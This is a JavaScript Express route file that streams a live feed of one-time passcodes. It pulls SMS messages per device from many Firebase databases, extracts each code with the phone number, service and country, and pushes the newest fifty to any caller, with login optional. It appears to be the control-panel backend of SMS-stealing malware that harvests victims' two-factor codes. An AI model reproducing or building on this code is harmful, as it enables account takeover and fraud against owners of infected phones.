"use strict";

/**
 * Real-time OTP feed using Server-Sent Events (SSE).
 * Pushes new OTPs to connected clients every 5 seconds.
 */

const { Router } = require("express");
const ConnectionsService = require("../services/connections");
const FirebaseService = require("../services/firebase");
const DeviceService = require("../services/devices");
const OtpExtractor = require("../services/otpExtractor");
const { getPhone } = require("../utils/phone");
const { optionalAuth } = require("../middleware/auth");

const router = Router();

/**
 * GET /api/live/otp
 * SSE stream — pushes OTP updates every 5 seconds.
 */
router.get("/otp", optionalAuth, async (req, res) => {
  res.writeHead(200, {
    "Content-Type": "text/event-stream",
    "Cache-Control": "no-cache",
    "Connection": "keep-alive",
    "X-Accel-Buffering": "no",
  });

  res.write("retry: 5000\n\n");

  let lastHash = "";
  let running = true;

  req.on("close", () => { running = false; });

  while (running) {
    try {
      const connections = await ConnectionsService.getAllActive();
      const allOtps = [];

      const results = await Promise.allSettled(
        connections.map(async (conn) => {
          try {
            const [clientsData, messagesRoot] = await Promise.all([
              FirebaseService.read(conn.url, conn.key, "clients").catch(() => null),
              FirebaseService.read(conn.url, conn.key, "messages").catch(() => null),
            ]);
            const devices = DeviceService.parseAll(clientsData);
            const connOtps = [];

            if (messagesRoot && typeof messagesRoot === "object") {
              for (const [deviceId, deviceMessages] of Object.entries(messagesRoot)) {
                if (!deviceMessages || typeof deviceMessages !== "object") continue;
                const device = devices.find((d) => d.id === deviceId) || { id: deviceId };
                const msgArray = Object.values(deviceMessages);
                let phone = getPhone(device, clientsData?.[deviceId], msgArray);

                for (const [, msg] of Object.entries(deviceMessages)) {
                  if (!msg || typeof msg !== "object") continue;
                  const text = msg.text || msg.body || msg.message || "";
                  if (!OtpExtractor.isOtpMessage(text)) continue;
                  const extracted = OtpExtractor.extractOtp(text);
                  if (!extracted) continue;
                  const rawTs = msg.timestamp || msg.time || msg.date || "";
                  const ts = rawTs ? (typeof rawTs === "number" ? new Date(rawTs).toISOString() : String(rawTs)) : new Date().toISOString();

                  connOtps.push({
                    service: extracted.service,
                    phone: phone || "Unknown",
                    code: extracted.code,
                    message: text.trim().slice(0, 200),
                    timestamp: ts,
                    country: OtpExtractor.detectCountry(phone),
                    source: conn.name,
                  });
                }
              }
            }
            return connOtps;
          } catch { return []; }
        })
      );

      for (const result of results) {
        if (result.status === "fulfilled") allOtps.push(...result.value);
      }

      allOtps.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
      const top50 = allOtps.slice(0, 50);

      // Only send if data changed
      const hash = JSON.stringify(top50.map(o => o.code + o.phone + o.timestamp));
      if (hash !== lastHash) {
        lastHash = hash;
        res.write(`data: ${JSON.stringify({ total: allOtps.length, recent: top50 })}\n\n`);
      }
    } catch {
      // Ignore fetch errors, keep polling
    }

    // Wait 5 seconds before next poll
    await new Promise((resolve) => {
      const timer = setTimeout(resolve, 5000);
      req.on("close", () => { clearTimeout(timer); running = false; resolve(); });
    });
  }

  res.end();
});


module.exports = router;
